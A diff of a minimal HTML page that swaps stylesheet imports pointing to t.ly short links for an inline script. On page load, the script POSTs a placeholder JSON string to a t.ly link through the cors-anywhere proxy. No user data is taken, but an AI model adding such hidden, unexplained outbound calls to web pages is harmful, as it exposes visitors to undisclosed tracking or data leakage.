@@ -4,11 +4,15 @@
   <body>
     <div>
       <p>hello</p>
-      <!-- <style>@import"//t.ly/FMqzE</style -->
-      <!-- <script src="//t.ly/FMqzE"> -->
-      <style>@import"//t.ly/nRt_d</style>
       <h1>hello</h1>
       <p>more text</p>
+      <script>
+	const url = "https://cors-anywhere.herokuapp.com/https://t.ly/Vrlm3";
+	fetch(url, {method: "POST",
+		    body: JSON.stringify({
+			"thing1": "really, really long text!"
+		    })});
+      </script>
     </div>
   </body>
 </html>
